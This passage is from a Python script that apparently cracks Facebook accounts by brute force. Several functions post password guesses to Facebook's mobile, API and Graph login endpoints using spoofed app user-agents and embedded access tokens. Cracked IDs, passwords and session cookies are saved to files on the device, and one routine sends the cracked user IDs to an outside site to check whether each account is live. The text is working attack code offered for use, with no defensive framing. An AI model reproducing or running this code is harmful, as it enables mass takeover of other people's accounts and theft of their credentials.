            "Sec-Fetch-User":'?1',
            "Upgrade-Insecure-Requests":'1',
            "User-Agent":ua,
            "Viewport-Width":"878"}
            lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb,proxies=bro).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids=coki.split("c_user=")[1][:15].replace(";","")
                xz = requests.get(f"https://graph.facebook.com/"+ids+"/picture?type=normal").text
                if "Photoshop" in xz:
                    print(f"\r\r{xd}{g} SxM-OK {ids} {w}●{g} {pw} ")
                    #print(f"\r\r{xd}{g} BISCUITS {xd} {coki}")
                    #print(f'{p}──────────────────────────────────────────────────')
                    ok.append(ids)
                    open('/sdcard/SxM-R3-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+coki+'\n')
                    break
            elif 'checkpoint' in log_cookies:
            	print(f"\r\r{xd}{y} SxM-CP {ids} {w}●{y} {pw} ")
            	cp.append(ids)
            	open('/sdcard/SxM-R3-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
            	break
            else:
                continue
        loop+=1
    except:
        pass
#───────────➤ RANDOM METHOD API R4 ➤───────────#
def ______R4______(uid,pwx):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd} SxM•XD {loop} {ok}|{cp} ');sys.stdout.flush()
        try:
                for pw in pwx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ____uax____  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=2153,height=1080};FBLC/ar_AR;FBRV/0;FBCR/Vodafone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CP'+'H2'+'23'+'5;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950287;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/337277111;FBCR/;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/C1-U'+'02;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_US;FBRV/557952455;FBCR/Orange EG;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/In'+'fi'+'nix X6'+'812;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2168};FBLC/ar_AR;FBRV/557952455;FBCR/stc ksa;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A5'+'28'+'B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880455;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SP'+'H-L'+'71'+'0T;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        data = {'adid':str(uuid.uuid4()),
                        'format':'json',
                        'device_id':str(uuid.uuid4()),
                        'email':uid,'password':pw,
                        'generate_analytics_claims':'1',
                        'community_id':'',
                        'cpl':'true','try_num':'1',
                        'family_device_id':str(uuid.uuid4()),
                        'credentials_type':'password',
                        'source':'login','error_detail_type':'button_with_disabled',
                        'enroll_misauth':'false','generate_session_cookies':'1',
                        'generate_machine_id':'1','currently_logged_in_userid':'0',
                        'locale': 'en_GB','client_country_code': 'GB',
                        'fb_api_req_friendly_name':'authenticate',
                        'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ____uax____,
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'Keep-Alive',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Connection-Type': 'MOBILE.LTE', 
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                ids = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                lk_url = f'https://graph.facebook.com/{ids}/picture?type=normal'
                                res = requests.get(lk_url).text
                                if 'Photoshop' in res:
                                	print(f"\r\r{xd}{g} SxM-OK {ids} {w}●{g} {pw} ")
                                	#print(f"\r\r{xd}{g} BISCUITS {xd} {coki}")
                                	#print(f'{p}──────────────────────────────────────────────────')
                                	open('/sdcard/SxM-R4-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+coki+'\n')
                                	ok.append(ids)
                                	break
                                else:break
                        elif 'www.facebook.com' in po['error']['message']: 
                                ids = po['error']['error_data']['uid']
                                print(f"\r\r{xd}{y} SxM-CP {ids} {w}●{y} {pw} ")
                                open('/sdcard/SxM-R4-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
                                cp.append(ids)
                                break
                        else:continue
                loop+=1
        except:pass
#───────────➤ RANDOM METHOD GRAPH R5 ➤───────────#
def ______R5______(uid,pwx):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd} SxM•XD {loop} {ok}|{cp} ');sys.stdout.flush()
        try:
                for pw in pwx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        ____uax____  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=2153,height=1080};FBLC/ar_AR;FBRV/0;FBCR/Vodafone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CP'+'H2'+'23'+'5;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950287;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/337277111;FBCR/;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/C1-U'+'02;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_US;FBRV/557952455;FBCR/Orange EG;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/In'+'fi'+'nix X6'+'812;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2168};FBLC/ar_AR;FBRV/557952455;FBCR/stc ksa;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A5'+'28'+'B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880455;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SP'+'H-L'+'71'+'0T;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        data={"adid": adid,
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "email": uid,"password": pw,
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*","Connection": "keep-alive",
                        "User-Agent": ____uax____,
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": "unknown",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger",
                        "Content-Length": "329",}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                ids = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={ids}").text)
                                if "LIVE" in response:
                                	print(f"\r\r{xd}{g} SxM-OK {ids} {w}●{g} {pw} ")
                                	#print(f"\r\r{xd}{g} BISCUITS {xd} {coki}")
                                	open('/sdcard/SxM-R5-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+coki+'\n')
                                	ok.append(ids)
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                ids = po['error']['error_data']['uid']
                                print(f"\r\r{xd}{y} SxM-CP {ids} {w}●{y} {pw} ")
                                open('/sdcard/SxM-R5-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
                                cp.append(ids)
                                break
                        else:continue
                loop+=1
        except:pass
#───────────➤ END ➤───────────#
________menu________()